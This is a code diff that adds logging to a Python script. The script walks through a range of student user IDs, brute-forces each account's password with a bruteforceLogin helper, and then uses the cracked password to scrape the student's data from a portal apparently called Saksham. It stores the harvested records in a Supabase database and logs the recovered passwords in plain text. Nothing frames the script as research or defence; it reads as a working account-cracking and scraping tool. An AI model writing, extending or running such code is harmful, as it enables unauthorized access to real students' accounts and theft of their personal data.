@@ -1,9 +1,13 @@
 from database.supabase_student_database import *
 from script.http_scripts import *
 import time
+import logging
 
 
 def main():
+    logging.basicConfig(level=logging.INFO, format='[%(asctime)s] - %(levelname)s - %(message)s')
+    logger = logging.getLogger()
+
     database = SupabaseStudentDatabase()
 
     for i in range(1203, 1300):
@@ -14,8 +18,10 @@ def main():
         try:
             if database.getStudentData(userid) is not None:
                 print(f"{userid} password already exist in database/being cracked")
+                logger.info(f"{userid} password already exist in database/being cracked")
             else:
                 print(f"{userid} password not found in database")
+                logger.info(f"{userid} password not found in database")
 
                 # Working status set in database
                 working_dict = {
@@ -27,6 +33,7 @@ def main():
                 start_time = time.perf_counter()
 
                 print("Cracking...")
+                logger.info("Cracking...")
                 password = bruteforceLogin(userid, 1000)
                 end_time = time.perf_counter()
                 elapsedTime = str(end_time - start_time)[:8]
@@ -42,6 +49,7 @@ def main():
 
                 else:
                     print("Password found: " + password)
+                    logger.info("Password found: " + password)
                     student = getStudentDataFromSaksham(userid, password)
 
                     # Names are scraped in  uppercase from saksham dashboard
@@ -70,11 +78,12 @@ def main():
                     }
                     database.addStudentData(userid, student_dict)
                     print(f"{userid} data retrieved and added to database")
+                    logger.info(f"{userid} data retrieved and added to database")
 
         except Exception as e:
             print(f"Error: {e}")
+            logger.error(f"Error: {e}")
 
 
 if __name__ == "__main__":
     main()
-
